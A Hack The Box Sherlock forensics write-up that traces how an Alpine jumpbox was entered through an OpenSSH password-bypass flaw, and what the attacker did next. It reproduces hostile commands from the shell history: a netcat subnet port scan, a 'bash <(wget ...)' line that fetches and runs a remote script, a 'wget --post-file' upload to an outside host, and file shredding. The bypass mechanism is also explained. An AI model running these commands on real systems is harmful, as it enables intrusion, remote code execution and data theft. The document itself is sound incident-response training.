---
title: "HTB Sherlock: SSHole"
author: baraka
date: 2026-11-08 12:30:00 +0300
description: A Hack The Box Sherlock writeup. A jumpbox compromised through an OpenSSH authentication bypass on Alpine Linux, investigated from a syslog file, a shadow file and one shell history.
categories: [ Security, HTB Sherlocks ]
tags: [ HTB, Sherlocks, SSHole, Linux Forensics, Alpine Linux, OpenSSH, CVE-2026-123158, Authentication Bypass, Shell History, DFIR ]
---

**Prepared by:** Mulandii · **Difficulty:** Very Easy

## Description

A jumpbox running Alpine Linux was compromised through a flaw in its SSH server, and the attacker used it to look at the network behind it. We are given a slice of the server's filesystem and have to work out how the attacker got in, which account they used, and what they did afterwards.

## Scenario

> Suspicious traffic was observed from a misconfigured jumpbox to a suspicious domain. You have been provided with evidence pulled from the jumpbox server. Determine how the attackers gained access to the server and what activity they performed afterwards.

## Artifacts Provided

`SSHole.zip` (SHA-256 `0fafbe2371c6f80b788d3c682c8a4c0603c37e4c2254e5c1da01bc22a23273e6`), password `hacktheblue`.

> HTB's own writeup lists a different SHA-256 for `SSHole.zip`. I could not reconcile the two, so the hash above only describes the copy I downloaded. The contents behaved as expected, and every answer below comes from the files themselves.
{: .prompt-warning }

## Skills Learnt

* Finding the right log on a system that does not use `auth.log`
* Recognising a known CVE pattern in SSH logs and in the shadow file
* Reading a shell history as evidence of attacker activity
* Understanding an authentication bypass at the mechanism level

## Initial Analysis

The zip is AES-encrypted, so we extract it with `bsdtar` into its own folder and run nothing from it:

```bash
mkdir extracted
bsdtar --passphrase hacktheblue -xf SSHole.zip -C extracted
find extracted -type f | wc -l
```

The collection is not a packet capture or a single log. It is a **slice of the server's filesystem**: 274 files in 108 directories, from a machine with the hostname `dev-jumpbox`. Only four top-level folders were collected:

| Folder | Files | What it holds |
|---|---|---|
| `etc/` | 211 | System configuration: SSH, users, passwords, cron |
| `var/` | 58 | Logs in `var/log/`, including `messages` and an empty `wtmp` |
| `home/` | 4 | One user, `adminsvc`, with a shell history, a text file and an SSH key pair |
| `root/` | 1 | Root's shell history |

One detail changes where we look. On Ubuntu, SSH logins go to `auth.log`. Alpine has no `auth.log`, because its logger writes every message to a single file, `/var/log/messages`, and puts the type of message at the start of each line (`auth.info`, `cron.info`, `daemon.debug`). That prefix is how we tell the SSH lines apart from the rest.

## Questions

### 1. What Linux distribution name and version was the targeted server running?

A Linux system describes itself in `/etc/os-release`, a tiny text file:

```bash
cd etc/
ls
cat os-release
```

![Desktop View](/assets/images/SSHole_blog/task1-os-release.png)
_`os-release` names the distribution and its version_

```
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.24.3
PRETTY_NAME="Alpine Linux v3.24"
```

`VERSION_ID` carries the full version, 3.24.3, while `PRETTY_NAME` shows only the release branch.

**Answer:** `Alpine Linux 3.24.3`

### 2. What is the CVE ID of the vulnerability abused by the attacker to gain access?

With an exact OS version, the quickest way to a vulnerability is to search for it:

![Desktop View](/assets/images/SSHole_blog/task2-cve-search.png)
_Searching for the OS version surfaces the CVE_

The search points to **CVE-2026-123158**, nicknamed **sshole**, an authentication bypass in OpenSSH on Alpine Linux. We did not stop at the search summary. The vendor write-ups from [StepSecurity](https://www.stepsecurity.io/blog/cve-2026-123158-sshhole-openssh-musl-password-bypass) and [Cycode](https://cycode.com/blog/sshole-cve-2026-123158-openssh-alpine-linux-vulnerability/) explain the mechanism, which has three parts:

1. In the shadow file, an account with no password has `*` in the password field. Nothing can ever match it.
2. Alpine's C library, musl, limits the password input to `crypt()` to **256 bytes**. For a longer password, `crypt()` fails, and the way it fails is by returning the string `*`.
3. When PAM is not in use, OpenSSH compares what `crypt()` returned with the stored field. `*` equals `*`, so the login is accepted without a real password check.

The write-ups give the exposed range as passwords between 257 and 1,024 bytes, on an sshd built against musl without PAM and with password logins enabled. Question 5 shows that this condition existed on our server.

**Answer:** `CVE-2026-123158`

### 3. When did the attacker exploit the vulnerability?

SSH events on Alpine are in `var/log/messages`. We filter for the two words `sshd` uses for a login attempt:

```bash
grep -nE 'Accepted|Failed' var/log/messages
```

![Desktop View](/assets/images/SSHole_blog/task3-adminsvc-login.png)
_Every SSH login in the log_

`-n` adds the line number, `-E` lets `Accepted|Failed` mean either word, and the log shrinks from 90 lines to 11. Two accounts appear:

| Time | Result | User | From |
|---|---|---|---|
| 06:43:00, 06:43:05 | failed, accepted | root | `192.168.72.131` |
| **11:27:05, 11:27:08** | **failed, accepted** | **adminsvc** | **`192.168.72.1`** |
| 12:03:29 to 12:28:40 | several accepted, one failed | root | `192.168.72.131` |

The `adminsvc` pair is the one that matters, and it is a short exchange in a single process:

```
11:27:05  sshd-session[4852]: Failed password for adminsvc from 192.168.72.1 port 61351 ssh2
11:27:08  sshd-session[4852]: Accepted password for adminsvc from 192.168.72.1 port 61351 ssh2
12:20:02  sshd-session[4854]: Received disconnect from 192.168.72.1 port 61351:11: disconnected by user
```

Both login lines carry the same process number and source port. A failure followed by a success inside one connection is also what the vendor write-ups describe: in their tests the oversized password was rejected on the first attempt and accepted on a later one in the same connection. The session lasted 52 minutes and 54 seconds, until the attacker disconnected.

`root` has a failed-then-accepted pair too, so the pattern alone does not single out `adminsvc`. We follow `adminsvc` because its account has no password (Question 5) and its shell history is the attack (Question 6). `root` has a real password hash.

The log has no year and no timezone, so the year comes from the dates on the collected files. HTB accepted the time as written.

**Answer:** `2026-11-06 11:27:08`

### 4. Which user account was abused by the attacker?

A login line shows that an account was used. To see how it was used, we look in the account's home folder, where a user's own activity is kept:

```bash
cd home/
ls
cd adminsvc/
ls -la
cat .ash_history
```

![Desktop View](/assets/images/SSHole_blog/task4-adminsvc-history.png)
_`adminsvc` is the only user under `/home`, and its shell history shows the attack_

The `-a` flag matters because `.ash_history` is a hidden file that plain `ls` skips. The history is Alpine's `ash` shell recording what the account typed, and it reads as five steps:

1. scanning a whole subnet
2. reading the scan result
3. running a script downloaded from the internet
4. uploading a file to an outside address
5. shredding that file

Compare it with `root/.ash_history`, which reads like someone setting up a server: `setup-alpine`, `apk add`, editing `sshd_config`, `ssh-copy-id`, `kubectl`. Nothing in it matches the attack pattern. A history file can be edited, so that is a judgement from behaviour and not proof, and the shadow file in Question 5 backs it up.

**Answer:** `adminsvc`

### 5. What string value causes the authentication bypass?

The mechanism from Question 2 says the trigger is an asterisk. The collection lets us check that the condition existed on this server, by looking at how each account is stored in `etc/shadow`. This command prints only the first characters of each password field, so no full hash appears here:

```bash
awk -F: '$1=="root"||$1=="adminsvc"{h=$2; if(length(h)>4) h=substr(h,1,4)"..."; print $1": "h}' etc/shadow
```

```
root: $6$f...
adminsvc: *
```

`root` has a real SHA-512 hash, which begins `$6$`. `adminsvc` has exactly `*`, meaning the account has no password. That is the vulnerable condition. When the attacker sent a password over 256 bytes, `crypt()` failed and returned `*`, which equals the stored `*`, and sshd let them in. It also explains why the attacker chose this account: a service account with no password and a working SSH login is easy to walk into.

The log never records the password that was sent, so the bypass is inferred from the account setup and the login pattern, not seen directly. We also did not confirm the OpenSSH version on the server. The vendor tests were on OpenSSH 10.3p1.

**Answer:** `*`

### 6. What command did the attacker use to scan the network reachable via the jumpbox, allowing them to target internal developer systems?

The command is in the same history file. We copy it from the file and do not retype it, because HTB compares it character by character:

![Desktop View](/assets/images/SSHole_blog/task6-scan-command.png)
_The scan, second line of the history_

```bash
for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done
```

| Part | What it does |
|---|---|
| `for ip in {1..254}` | loops over every host address from `.1` to `.254` |
| `nc -zvw 1` | netcat in scan mode: `-z` connects without sending data, `-v` reports, `-w 1` waits one second |
| `192.168.18.$ip 1-65535` | each host, on every possible TCP port |
| `2>&1` | `nc` writes its results to the error stream, so this sends them down the pipe |
| `grep -E` with `succeeded` or `open` | keeps only the ports that answered |

The attacker used the `nc` that Alpine already provides, so nothing had to be downloaded. The next history lines are `vi scanreport.txt` and `cat scanreport.txt`, and that file is in the same folder:

```
192.168.18.5 443 445 3389
192.168.18.23 88 139 445 3389 6801 54321
```

Two hosts answered. Port 88 is Kerberos, and a host offering it together with 445 and 139 looks like a Windows domain controller. That is our reading of the ports, and the scan does not say what the machines are.

**Answer:** `for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done`

### 7. What was the exfiltration URI where the attacker exfiltrated a sensitive file?

The last lines of the history are the second half of the attack:

![Desktop View](/assets/images/SSHole_blog/task7-exfil-uri.png)
_The upload command, with its destination circled_

```bash
bash <(wget -qO- https://raw.githubusercontent.com/papinyurii33/devscripts/refs/heads/main/setup.sh)
ls -la /tmp
ls -l /tmp/.devenv
wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
shred -u /tmp/.devenv
exit
```

Reading it line by line:

* `bash <(wget -qO- URL)` downloads a script and runs it in one step, without saving it to disk, so nothing from this line stays behind to find.
* `ls -la /tmp` and `ls -l /tmp/.devenv` check that the script left a file. The leading dot makes it a hidden file.
* `wget --post-file=/tmp/.devenv -O- URL` sends the contents of that file as the body of a POST request. `-O-` prints the server's reply to the screen.
* `shred -u /tmp/.devenv` overwrites the file and then deletes it, so it cannot be recovered later.

The sequence is the point: the script produced a file, the attacker uploaded it, and then destroyed the original. The destination of the upload is the exfiltration address.

We can say what the commands did but not what the file held. `/tmp` was not collected, the file was shredded, and we did not download `setup.sh`. From the name and the sequence we would guess credentials or tokens, but that is a guess. The shell history also has no timestamps, so the commands can be put in order but not in time.

**Answer:** `https://devv.coding.eu/process`

## Summary

The jumpbox ran Alpine Linux 3.24.3 with an OpenSSH that is vulnerable to CVE-2026-123158. Its `adminsvc` account had no password, stored as `*`, and at 11:27:08 on 6 November the attacker logged in to it with an oversized password. From that session they scanned `192.168.18.0/24` with netcat, found two hosts, ran a script from GitHub, uploaded a hidden file to `devv.coding.eu`, and shredded the original. They disconnected at 12:20:02.

The attacker's address, `192.168.72.1`, is a private one, so the logs do not show where they really came from. The root logins from `192.168.72.131` between 12:03 and 12:28 include an SFTP write error under `/root/alpine/`, which looks like files being copied off the box. We did not treat those logins as part of the attack, but the logs cannot prove it.
